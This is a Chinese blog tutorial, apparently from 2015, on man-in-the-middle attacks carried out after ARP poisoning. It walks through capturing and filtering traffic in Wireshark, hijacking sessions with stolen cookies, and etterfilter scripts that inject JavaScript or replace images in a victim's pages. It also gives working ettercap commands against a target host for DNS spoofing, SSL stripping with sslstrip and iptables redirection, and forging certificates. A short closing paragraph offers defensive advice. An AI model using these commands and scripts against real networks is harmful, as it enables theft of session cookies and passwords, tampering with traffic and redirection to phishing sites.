---
layout: post
title:  "细说中间人攻击(一)"
date:   2015-11-01 11:11:26
comments: true
categories: Tech
---

在之前的[ARP欺骗与中间人攻击][last-post]讲到了MITM攻击的基础和原理，并且在实验中成功对网关和目标主机进行了ARP毒化，从而使得无论目标的外出数据或流入数据都会经过本机这个“中间人”。在后记里也略为提及到，
中间人可以做的事情有很多，但是没有详细介绍。本文主要介绍了在ARP毒化和简单的DNS劫持情况下如何截获目标的会话和COOKIE等验证信息，以及如何对截获的会话进行简单修改。

 
### 流量分析

通常我们成功变成中间人之后，会一直捕捉目标的流量数据并且保存为本地的cap文件，然后再用工具对数据信息进行分析。流量抓取的方式有很多，比如Linux下的[tcpdump][tcpdump]（Window下为Windump），
ettercap和wireshark（曾经的ehtereal）等，但是说到流量分析，就不能不提到大名鼎鼎的Wireshark。wireshark是一款用于网络封包的协议分析的开源软件，其最基本的功能就是捕捉指定网络接口的流量
数据，并且按照其协议格式显示。我们这里仅用其来捕捉和分析数据，网络专家还可以用它来debug网络协议实现细节，检查安全问题，网络协议内部构件等等。

### 过滤报文

面对大量来自各个客户端各种协议的报文，我们需要对其进行过滤筛选，比如指定IP地址的HTTP报文等过滤条件，可以在filter栏里直接写过滤条件，或者在Analyze->Display Filter里面定义并添加自己
的过滤条件。另外Wireshark还提供了追踪TCP/UDP流的功能，直接右键封包点击Follow TCP stream即可看见服务器和目标之间的全部会话，值得注意的是，关闭会话数据窗口后，过滤条件会被自动引用。

虽然我们暂时不必理解各个协议的实现细节，但是对基本的HTTP，TCP/IP和ARP等协议的层次结构还是需要有一定理解的，况且到了某个阶段当我们不满足于仅仅用脚本进行攻击的时候，仍然还是需要了解
协议实现细节并找到攻击漏洞，当然这是后话了。常见协议的基本模型如下图所示：

![ISO Modle](http://images2015.cnblogs.com/blog/676200/201511/676200-20151101122516700-921517685.png)
 
### 统计信息

在wireshark的标题栏中有一个选项Statistics里面包含了许多本次capfile的统计信息，如wireshark的IO Graphs等，我们可以用wireshark的IO Graphs工具来分析抓包的数据流。IO Graphs是一个非常好用的工具。
基本的Wireshark IO graph会显示抓包文件中的整体流量情况，通常是以每秒为单位（报文数或字节数）。默认X轴时间间隔是1秒，Y轴是每一时间间隔的报文数。如果想要查看 每秒bit数或byte数，点击“Unit”，
在“Y Axis”下拉列表中选择想要查看的内容。这是一种基本的应用，对于查看流量中的波峰/波谷很有帮助。另外还可以查看protocol hierarchy（显示捕捉文件包含的所有协议的树状分支）；
也可以查看会话统计（conversation）来按分类分析数据。

这里单独说一下Statistics里的HTTP统计。分别可以查看packet counter，requests 和 load distribution的信息，针对每个信息，还可以设置特定的过滤规则，如要获得指定HTTP主机的统计信息，
设置过滤条件http.host contains <host\_name> 或 http.host==<host\_name>，再如，通过设置过滤条件http.host contains xxoo.com，可以获得站点xxoo.com的统计信息。值得一提的是，当我们
打开一个网页，通常会向若干个URL发送请求，比如页面重定向，外链和广告等，可以自己设置合适的规则来过滤。比如目标主机浏览了豆瓣，知乎和dudata，

全部截取的http request流量是这样的：

![Wireshark packet](http://images2015.cnblogs.com/blog/676200/201509/676200-20150930171539793-2073284993.png)

经过自定义过滤规则，可以把一些不必要的信息去掉，下面的过滤规则为 http.host contains www

![Wireshark filter](http://images2015.cnblogs.com/blog/676200/201509/676200-20150930171620543-2125398487.png)

wireshark还有很多其他功能，比如以endpoint来查看数据包的统计信息等，总而言之，wireshark是个很强大的网络分析工具，详细的用法可以自己在帮助手册中查看。

 
### 会话劫持

会话劫持（session hijacker）是最基本的一种中间人攻击手段。攻击者通过分析目标的HTTP流量来获得其账户的cookie，从而用此信息来取得含有身份信息的会话页面。
其原理十分简单，就是用工具（如上面的wireshark）在捕捉到的数据包里提取出HTTP数据中含有cookie字段的信息，然后用工具（如火狐浏览器的Firebug）按样填写cookie对应
字段即可登录原网站。我这里是用了火狐的Greasemonkey+cookie injector来实现cookie的登录。值得一提的是，[Greasemonkey][Greasemonkey]是一个非常有用的浏览器插件，可以根据浏览的网站
来执行特定的javascript脚本，比如cookie injector就是一个根据wireshark复制的cookie格式来登录页面的一个js脚本，从而可以在自己的浏览器上登录目标帐号。此外在[这个网站][Greasemonkey-scripts]
还能找到其他很多有意思的脚本，可以自己去发掘。

除了用传统方式劫持会话，还有一些其他的小工具可以使这个过程变得简单化，比如ferret和hamster等等。

 
### 会话修改

会话劫持可以有效窥视目标的隐私信息，但是中间人能做的不止于此。既然目标所接收到的数据都是经过中间人转发的，那么中间人自然可以对其进行修改。这里要用到ettercap工具，之前也提到过很多次了，
这里就稍微详细介绍一下。ettercap是一个多用途的嗅探器/内容过滤器，常用于中间人的攻击中。其一般命令格式为：

    ettercap [OPTIONS] [TARGET1] [TARGET2]

其中, TARGET可以是MAC/IP/IPV6/端口，其中IP和端口可以用范围表示，比如/192.168.1.100-120/20,22

**修改网页内容**

ettercap有强大的过滤脚本功能，其原理是对要转发到目标的数据包进行修改，可以实现替换网页内容、替换下载链接和插入js脚本等效果。过滤脚本是指在ettercap中用于描述修改规则的.filter文件，下面举例说明。

首先是在目标请求的网页里插入js脚本，这里以最简单的弹窗为例，etterfilter过滤脚本如下：

    if (ip.proto == TCP && tcp.dst == 80)
    {
        if (search(DATA.data, "Accept-Encoding"))
        {
            replace("Accept-Encoding", "Accept-Rubbish!");
            # note: replacement string is same length as original string
            msg("zapped Accept-Encoding!\n");
        }
    }
    if (ip.proto == TCP && tcp.src == 80)
    {
        replace("<head>", "<head><script type="text/javascript">alert('big brother is watching you');</script>");
        replace("<HEAD>", "<HEAD><script type="text/javascript">alert('big brother is watching you');</script>");
        msg("Injecting OK!!\n");
    }


过滤脚本的语法很简单，可以直接man etterfilter查看。上述脚本的第一个if块的含义是使得请求的数据包不要进行压缩。需要特别注意的是，if和括号之间必须有空格，而函数和括号之间不能有空格。将上述过滤脚本保存为alert.filter，然后编译：

    etterfilter alert.filter -o alert.ef

其中编译后的alert.ef是ettercap可识别的二进制过滤文件。

这里假设要攻击的目标为192.168.1.106，网关为192.168.1.1，使用上述过滤脚本进行攻击的方法为：

     ettercap -i wlan0 -Tq -M arp:remote /192.168.1.106/ /192.168.1.1/ -F alert.ef

 运行后当目标用浏览器浏览http网站的时候，就会出现弹窗显示“big brother is watching you”

![Big brother watching]({{ site.baseurl}}/images/big-brother-watching.png)

除了插入脚本，还可以替换网页的图片和文本等内容，这里以替换图片为例，过滤脚本为：

    if (ip.proto == TCP && tcp.dst == 80) 
    {
       if (search(DATA.data, "Accept-Encoding")) 
    　　{
          replace("Accept-Encoding", "Accept-Rubbish!"); 
          # note: replacement string is same length as original string
          msg("zapped Accept-Encoding!\n");
       }
    }
    if (ip.proto == TCP && tcp.src == 80) 
    {
       replace("img src=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
       replace("IMG SRC=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
       msg("Replace OK.\n");
    }

运行方法还是与之前类似。这里用到了内置函数replace()，etterfilter里还有很多有用的内置函数，详情可以在manpage中查看。

随便打开一个美女图片的网站，替换效果如下：

![replace img](http://images2015.cnblogs.com/blog/676200/201510/676200-20151003103038152-1419285557.png)

**DNS欺骗**

DNS为域名解析，即从url网址到ip地址的转换过程，通过DNS欺骗，我们可以把目标的请求重定向到指定的ip地址去，比如钓鱼地址。利用现有的工具，比如SET（social engineering toolkit）就可以很容易伪造钓鱼网站
从而使目标上当，当然这是后话了。通过ettercap的dns\_spoof插件就可以对目标的DNS进行污染，值得一提的是，ettercap里有很多插件，都通过-P选项来调用。

要使用DNS欺骗，首先修改/usr/local/share/ettercap/etter.dns文件，添加对应的url到ip的映射关系，

    baidu.com     　　  A     　　202.89.233.101
    *.baidu.com     　　A    　　 202.89.233.101
    www.baidu.com   　PTR        202.89.233.101

然后再运行

    ettercap -i wlan0 -Tq -M arp:remote /192.168.1.106/ /192.168.1.1/ -P dns_spoof

此时目标（192.168.1.106）访问百度的时候，就会被重定向到202.89.233.101，这里注意的是前提要目标之前最近没访问过百度，也就是说要求目标DNS缓存里没有百度的ip，否则就需要刷新其DNS缓存才能生效。

 
### 针对SSL的中间人攻击

在中间人嗅探目标和服务器之间的流量的时候，如果目标使用的是HTTP链接，当其填写表单并提交的时候，我们一般可以捕捉到明文的帐号密码信息。然而，如果目标使用的是HTTPS，则我们抓到的数据是加密过的乱码，
无法得到有用的信息。HTTPS即为HTTP+SSL，在应用层和网络层之间加入了SSL（加密套接字协议层）。具体的协议详情就不说了，只讲一下在这种情况下的应对方法。

**SSL卸载**

SSL卸载的原理是，利用目标的疏忽，将其HTTPS链接替换成HTTP，从而达到嗅探明文信息的目的。这里使用Moxie Marlinspike开发的sslstrip工具来实现：
首先打开sslstrip，指定监听的端口，默认为端口10000，这里使用默认端口，“-l 10000“可以不写。

    sslstrip -l 10000

然后开启内核转发，将HTTP（80端口）的流量转发到sslstrip监听的端口上去。关于转发的具体选项可以参考我上一篇ARP欺骗与中间人攻击。

    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000

最后使用ettercap进行中间人攻击

    ettercap -i wlan0 -Tq -M arp:remote /192.168.1.106/ /192.168.1.1/

此时目标访问https的网站时，会自动变成http，于是我们就能抓取明文的数据了。

 
**伪造SSL证书**

要伪造SSL证书，需要了解SSL的认证过程，其主要分为服务器认证和用户认证两个阶段，其中：

    服务器认证阶段：
    1）客户端向服务器发送一个开始信息“Hello”以便开始一个新的会话连接；
    2）服务器根据客户的信息确定是否需要生成新的主密钥，如需要则服务器在响应客户的“Hello”信息时将包含生成主密钥所需的信息；
    3）客户根据收到的服务器响应信息，产生一个主密钥，并用服务器的公开密钥加密后传给服务器；
    4）服务器回复该主密钥，并返回给客户一个用主密钥认证的信息，以此让客户认证服务器。
     
用户认证阶段：在此之前，服务器已经通过了客户认证，这一阶段主要完成对客户的认证。经认证的服务器发送一个提问给客户，客户则返回（数字）签名后的提问和其公开密钥，从而向服务器提供认证。
作为中间人，我们可以在认证过程中也插一脚。大体流程如下：

1). 首先伪造一组rsa公/私钥对，可以用openssl来生成：

    #openssl genrsa -out private.key 1024
    #openssl rsa -in private.key -pubout -out public.key

2). 由于SSL协议走的不是80端口而是443端口，我们需要开启本机内核转发功能，用iptable将流向网关和目标的443端口数据重定向到本机：

    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -F
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to 192.168.1.100  
    (假设192.168.1.100是攻击者IP)

3). 最后在本机上对目标和服务器进行双向SSL认证，结果使得目标和中间人进行了SSL链接，中间人和服务器进行SSL链接，这样中间人转发数据的同时，也拥有了明文的信息。具体实现可以用libssl+socket自己写，
限于篇幅这里就不细说了。另外值得一提的是，对于伪造的SSL证书，目标浏览器在上网的时候会提示该证书不受信任，因此这只是提供一种思路，除非目标十分粗心大意，否则并没有太大的攻击效用。

**SSL/TLS破解**

要知道SSL采用RSA加密，要暴力破解几乎是不可能的，但是由于SSL/TLS中使用"记录协议数据包"来封装上层的应用数据，而且 SSL/TLS使用CBC加密模式进行分组对称加密，不同"记录协议数据包"之间并不是独立的IV，
不同的数据包之间形成一个整体的CBC模式 ，因此 攻击者可以在返回流量中注入js代码，根据攻击者已知的IV和Ciper，来穷举出下一个数据包中包含的cookie信息，从而破解出HTTPS的明文数据。具体实现过程可以
参考讨论相关技术的博文，如BEAST、CRIME等针对openssl漏洞的攻击。

### 后记

中间人攻击的手段多种多样，用于MITM攻击的工具也已经有很多，比如driftnet、dsniff、ettercap、sslstrip等，本文主要介绍了其中的一部分；但是最主要的还是要理解其原理，即ARP，修改以及转发，知道其工作过程后，
我们甚至可以不借助工具，通过socket编程就能自己写一个简单的中间人攻击程序。另外作为一个普通的用户而言，面对中间人的潜在威胁，也需要提高自己的安全防范意识，比如尽量使用https链接保护自身隐私，对于SSL证书的
异常提醒也要非常注意，尤其是在涉及到金钱交易的网站之时，更是需要小心慎重，以免落入他人的陷阱之中。

[last-post]: http://pannzh.github.io/tech/2015/11/01/arp-mitm.html
[tcpdump]: http://drops.wooyun.org/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/8885
[Greasemonkey]: https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/
[Greasemonkey-scripts]: https://greasyfork.org/en/scripts/
